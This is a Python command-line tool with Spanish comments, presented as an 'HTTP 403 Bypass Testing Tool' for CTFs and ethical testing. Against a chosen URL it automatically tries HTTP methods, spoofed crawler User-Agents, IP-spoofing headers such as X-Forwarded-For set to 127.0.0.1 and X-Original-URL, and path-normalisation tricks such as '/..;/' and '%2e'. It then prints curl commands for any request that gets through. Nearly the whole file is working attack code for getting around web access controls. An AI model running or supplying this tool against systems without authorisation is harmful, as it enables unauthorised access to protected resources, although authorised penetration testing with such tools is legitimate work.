#!/usr/bin/env python3
"""
HTTP 403 Bypass Testing Tool
Para uso en CTFs y testing ético de seguridad
"""

import requests
import sys
import argparse
from urllib.parse import urlparse, urljoin, quote
import time
import json
from collections import defaultdict

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# Almacenar resultados por código de estado
results_by_code = defaultdict(list)
successful_requests = []

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║                HTTP 403 Bypass Testing Tool                   ║
║                     Para CTFs y Testing Ético                 ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}
    """
    print(banner)

def test_request(url, method='GET', headers=None, data=None, timeout=10):
    """Realiza una petición HTTP y retorna el código de estado"""
    try:
        if headers is None:
            headers = {}
        
        response = requests.request(
            method=method,
            url=url,
            headers=headers,
            data=data,
            timeout=timeout,
            allow_redirects=False,
            verify=True
        )
        return response.status_code, len(response.content), response.headers.get('Content-Type', '')
    except requests.exceptions.RequestException as e:
        return f"Error: {str(e)}", 0, ""

def generate_curl_command(url, method='GET', headers=None):
    """Genera comando curl equivalente"""
    curl_cmd = f"curl -X {method}"
    
    if headers:
        for key, value in headers.items():
            curl_cmd += f" -H '{key}: {value}'"
    
    curl_cmd += f" '{url}'"
    return curl_cmd

def store_result(technique, url, method, headers, status_code, content_length, content_type):
    """Almacena resultado para posterior análisis"""
    result = {
        'technique': technique,
        'url': url,
        'method': method,
        'headers': headers or {},
        'status_code': status_code,
        'content_length': content_length,
        'content_type': content_type,
        'curl_command': generate_curl_command(url, method, headers)
    }
    
    if isinstance(status_code, int):
        results_by_code[status_code].append(result)
        
        # Guardar peticiones exitosas
        if status_code == 200:
            successful_requests.append(result)

def print_live_result(technique, url, status_code, content_length):
    """Imprime resultado en tiempo real (versión compacta)"""
    if isinstance(status_code, str):  # Es un error
        symbol = "✗"
        color = Colors.RED
    elif status_code == 200:
        symbol = "✓"
        color = f"{Colors.GREEN}{Colors.BOLD}"
    elif status_code in [301, 302, 307, 308]:
        symbol = "↳"
        color = Colors.YELLOW
    elif status_code == 403:
        symbol = "⚠"
        color = Colors.RED
    elif status_code == 404:
        symbol = "?"
        color = Colors.BLUE
    else:
        symbol = "•"
        color = Colors.WHITE
    
    # Truncar técnica si es muy larga
    technique_short = technique[:25] + "..." if len(technique) > 28 else technique
    
    print(f"{color}{symbol} {technique_short:<28} | {status_code}{Colors.END}")

def generate_user_agents():
    """Genera lista de User-Agents comunes"""
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "curl/7.68.0",
        ""
    ]

def generate_bypass_headers(target_url=None):
    """Genera headers comunes para bypass"""
    headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-ProxyUser-Ip": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Original-URL": "/"},
        {"X-Rewrite-URL": "/"},
        {"Referer": "https://google.com"},
        {"Origin": "https://google.com"},
        {"X-Forwarded-Proto": "https"},
        {"X-Forwarded-Port": "443"},
        {"X-Forwarded-Ssl": "on"},
        {"Host": "localhost"}
    ]
    
    # Agregar referrer como la propia web si se proporciona la URL
    if target_url:
        parsed_url = urlparse(target_url)
        base_domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Diferentes variaciones del referrer con la propia web
        self_referrers = [
            {"Referer": base_domain},
            {"Referer": f"{base_domain}/"},
            {"Referer": f"{base_domain}/index.html"},
            {"Referer": f"{base_domain}/home"},
            {"Referer": f"{base_domain}/login"},
            {"Origin": base_domain}
        ]
        
        headers.extend(self_referrers)
    
    return headers

def generate_path_variations(original_path):
    """Genera variaciones del path para bypass"""
    if not original_path or original_path == "/":
        original_path = "/"
    
    # Asegurarse de que el path comience con /
    if not original_path.startswith('/'):
        original_path = '/' + original_path
    
    variations = [
        original_path,
        original_path + "/",
        original_path + "/.",
        original_path + "//",
        original_path + "///",
        original_path + "/..",
        original_path + "/./",
        original_path + "/../",
        original_path + "/.;/",
        original_path + "/..;/",
        original_path + "?",
        original_path + "#",
        original_path + " ",
        original_path + "%20",
        original_path.upper(),
        original_path.lower(),
        # URL encoding variations - aplicar correctamente
        quote(original_path, safe=''),
        original_path.replace('/', '%2f'),
        original_path.replace('/', '//'),
        # Variaciones con puntos codificados
        original_path.replace('.', '%2e'),
        original_path + '/%2e%2e/',
        original_path + '/%2f%2e%2e%2f'
    ]
    
    return list(set(variations))  # Eliminar duplicados

def test_http_methods(base_url):
    """Prueba diferentes métodos HTTP"""
    methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'PATCH', 'DELETE', 'TRACE']
    
    print(f"\n{Colors.PURPLE}{Colors.BOLD}[1/5] Probando Métodos HTTP{Colors.END}")
    print(f"{Colors.CYAN}{'Técnica':<30} | Status{Colors.END}")
    print("─" * 45)
    
    for method in methods:
        status_code, content_length, content_type = test_request(base_url, method=method)
        technique = f"Método {method}"
        print_live_result(technique, base_url, status_code, content_length)
        store_result(technique, base_url, method, None, status_code, content_length, content_type)
        time.sleep(0.1)

def test_user_agents(base_url):
    """Prueba diferentes User-Agents"""
    user_agents = generate_user_agents()
    
    print(f"\n{Colors.PURPLE}{Colors.BOLD}[2/5] Probando User-Agents{Colors.END}")
    print(f"{Colors.CYAN}{'Técnica':<30} | Status{Colors.END}")
    print("─" * 45)
    
    for i, ua in enumerate(user_agents):
        headers = {"User-Agent": ua} if ua else {}
        technique = f"UA-{i+1}" if ua else "Sin User-Agent"
        status_code, content_length, content_type = test_request(base_url, headers=headers)
        print_live_result(technique, base_url, status_code, content_length)
        store_result(technique, base_url, 'GET', headers, status_code, content_length, content_type)
        time.sleep(0.1)

def test_bypass_headers(base_url):
    """Prueba headers de bypass"""
    bypass_headers = generate_bypass_headers(base_url)
    
    print(f"\n{Colors.PURPLE}{Colors.BOLD}[3/5] Probando Headers de Bypass{Colors.END}")
    print(f"{Colors.CYAN}{'Técnica':<30} | Status{Colors.END}")
    print("─" * 45)
    
    for headers in bypass_headers:
        header_name = list(headers.keys())[0]
        header_value = list(headers.values())[0]
        
        # Para mostrar mejor los referrers propios
        if header_name in ["Referer", "Origin"] and base_url in str(header_value):
            technique = f"{header_name} (Self)"
        else:
            technique = f"Header {header_name}"
            
        status_code, content_length, content_type = test_request(base_url, headers=headers)
        print_live_result(technique, base_url, status_code, content_length)
        store_result(technique, base_url, 'GET', headers, status_code, content_length, content_type)
        time.sleep(0.1)

def test_path_variations(base_url):
    """Prueba variaciones del path"""
    parsed_url = urlparse(base_url)
    base_without_path = f"{parsed_url.scheme}://{parsed_url.netloc}"
    original_path = parsed_url.path if parsed_url.path else "/"
    
    path_variations = generate_path_variations(original_path)
    
    print(f"\n{Colors.PURPLE}{Colors.BOLD}[4/5] Probando Variaciones de Path{Colors.END}")
    print(f"{Colors.CYAN}{'Técnica':<30} | Status{Colors.END}")
    print("─" * 45)
    
    for path in path_variations[:15]:  # Limitar para no saturar
        # Construir URL correctamente
        try:
            # Si el path ya está codificado o es una variación especial, usarlo directamente
            if path.startswith('/'):
                test_url = base_without_path + path
            else:
                test_url = base_without_path + '/' + path
                
            technique = f"Path: {path[:20]}..." if len(path) > 20 else f"Path: {path}"
            status_code, content_length, content_type = test_request(test_url)
            print_live_result(technique, test_url, status_code, content_length)
            store_result(technique, test_url, 'GET', None, status_code, content_length, content_type)
            time.sleep(0.1)
            
        except Exception as e:
            technique = f"Path: {path[:20]}..." if len(path) > 20 else f"Path: {path}"
            print_live_result(technique, f"Error en URL: {str(e)}", "Error", 0)
            continue

def test_combined_techniques(base_url):
    """Prueba combinaciones de técnicas"""
    print(f"\n{Colors.PURPLE}{Colors.BOLD}[5/5] Probando Técnicas Combinadas{Colors.END}")
    print(f"{Colors.CYAN}{'Técnica':<30} | Status{Colors.END}")
    print("─" * 45)
    
    # Obtener el dominio base para referrers propios
    parsed_url = urlparse(base_url)
    base_domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    combinations = [
        {
            'technique': 'POST + Headers + Self-Ref',
            'method': 'POST',
            'headers': {
                "X-Forwarded-For": "127.0.0.1",
                "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
                "Referer": base_domain
            }
        },
        {
            'technique': 'OPTIONS + Self-Origin',
            'method': 'OPTIONS',
            'headers': {
                "X-Real-IP": "127.0.0.1",
                "Referer": f"{base_domain}/",
                "Origin": base_domain
            }
        },
        {
            'technique': 'Googlebot + Self-Ref',
            'method': 'GET',
            'headers': {
                "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "Referer": f"{base_domain}/index.html",
                "X-Forwarded-For": "127.0.0.1"
            }
        }
    ]
    
    for combo in combinations:
        status_code, content_length, content_type = test_request(
            base_url, 
            method=combo['method'], 
            headers=combo['headers']
        )
        print_live_result(combo['technique'], base_url, status_code, content_length)
        store_result(combo['technique'], base_url, combo['method'], combo['headers'], status_code, content_length, content_type)
        time.sleep(0.1)

def print_summary():
    """Imprime resumen organizado por códigos de estado"""
    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}                            RESUMEN DE RESULTADOS{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}")
    
    # Ordenar códigos de estado
    sorted_codes = sorted(results_by_code.keys(), key=lambda x: (isinstance(x, str), x))
    
    for code in sorted_codes:
        results = results_by_code[code]
        count = len(results)
        
        # Colores según código
        if isinstance(code, str):
            color = Colors.RED
            icon = "❌"
        elif code == 200:
            color = f"{Colors.GREEN}{Colors.BOLD}"
            icon = "✅"
        elif code in [301, 302, 307, 308]:
            color = Colors.YELLOW
            icon = "🔄"
        elif code == 403:
            color = Colors.RED
            icon = "🚫"
        elif code == 404:
            color = Colors.BLUE
            icon = "❓"
        else:
            color = Colors.WHITE
            icon = "ℹ️"
        
        print(f"\n{color}{icon} Código {code} ({count} resultado{'s' if count != 1 else ''}){Colors.END}")
        
        # Mostrar algunos ejemplos
        for i, result in enumerate(results[:3]):  # Máximo 3 por código
            technique_short = result['technique'][:40] + "..." if len(result['technique']) > 43 else result['technique']
            print(f"   • {technique_short}")
        
        if len(results) > 3:
            print(f"   • ... y {len(results) - 3} más")

def print_successful_requests():
    """Imprime comandos curl para peticiones exitosas"""
    if not successful_requests:
        print(f"\n{Colors.YELLOW}No se encontraron peticiones exitosas (200 OK){Colors.END}")
        return
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 PETICIONES EXITOSAS (200 OK){Colors.END}")
    print(f"{Colors.GREEN}{'='*80}{Colors.END}")
    
    for i, req in enumerate(successful_requests, 1):
        print(f"\n{Colors.GREEN}{Colors.BOLD}[{i}] {req['technique']}{Colors.END}")
        print(f"{Colors.CYAN}URL:{Colors.END} {req['url']}")
        print(f"{Colors.CYAN}Método:{Colors.END} {req['method']}")
        print(f"{Colors.CYAN}Tamaño:{Colors.END} {req['content_length']} bytes")
        if req['content_type']:
            print(f"{Colors.CYAN}Tipo:{Colors.END} {req['content_type']}")
        print(f"{Colors.YELLOW}Comando curl:{Colors.END}")
        print(f"{Colors.WHITE}{req['curl_command']}{Colors.END}")
        
        if i < len(successful_requests):
            print(f"{Colors.GREEN}{'-'*60}{Colors.END}")

def print_filtered_results(filter_code):
    """Imprime resultados filtrados por código de estado"""
    if filter_code not in results_by_code:
        print(f"\n{Colors.YELLOW}No se encontraron resultados con código {filter_code}{Colors.END}")
        return
    
    results = results_by_code[filter_code]
    print(f"\n{Colors.BOLD}RESULTADOS CON CÓDIGO {filter_code} ({len(results)} encontrados){Colors.END}")
    print("="*80)
    
    for i, result in enumerate(results, 1):
        print(f"\n{Colors.BOLD}[{i}] {result['technique']}{Colors.END}")
        print(f"URL: {result['url']}")
        print(f"Método: {result['method']}")
        print(f"Headers: {json.dumps(result['headers'], indent=2) if result['headers'] else 'Ninguno'}")
        print(f"Tamaño: {result['content_length']} bytes")
        print(f"Curl: {result['curl_command']}")
        if i < len(results):
            print("-" * 60)

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description='HTTP 403 Bypass Testing Tool')
    parser.add_argument('-u', '--url', help='URL objetivo')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Timeout en segundos (default: 10)')
    parser.add_argument('-f', '--filter', type=int, help='Filtrar resultados por código de estado')
    parser.add_argument('--show-all', action='store_true', help='Mostrar todos los resultados detallados')
    
    args = parser.parse_args()
    
    if args.url:
        target_url = args.url
    else:
        target_url = input(f"{Colors.CYAN}Ingresa la URL objetivo: {Colors.END}")
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    print(f"\n{Colors.BOLD}🎯 Objetivo: {target_url}{Colors.END}")
    print(f"{Colors.YELLOW}⚡ Iniciando escaneo de bypass 403...{Colors.END}")
    
    # Prueba inicial
    print(f"\n{Colors.PURPLE}{Colors.BOLD}[0/5] Prueba Inicial{Colors.END}")
    status_code, content_length, content_type = test_request(target_url)
    print(f"Estado inicial: {status_code} ({content_length} bytes)")
    store_result("Inicial", target_url, 'GET', None, status_code, content_length, content_type)
    
    # Ejecutar todas las pruebas
    test_http_methods(target_url)
    test_user_agents(target_url)
    test_bypass_headers(target_url)
    test_path_variations(target_url)
    test_combined_techniques(target_url)
    
    # Mostrar resultados
    if args.filter:
        print_filtered_results(args.filter)
    else:
        print_summary()
        print_successful_requests()
    
    if args.show_all:
        print(f"\n{Colors.BOLD}TODOS LOS RESULTADOS DETALLADOS{Colors.END}")
        for code in sorted(results_by_code.keys(), key=lambda x: (isinstance(x, str), x)):
            print_filtered_results(code)
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}✅ Escaneo completado!{Colors.END}")
    print(f"{Colors.CYAN}💡 Usa --filter [código] para ver detalles de un código específico{Colors.END}")

if __name__ == "__main__":
    main()
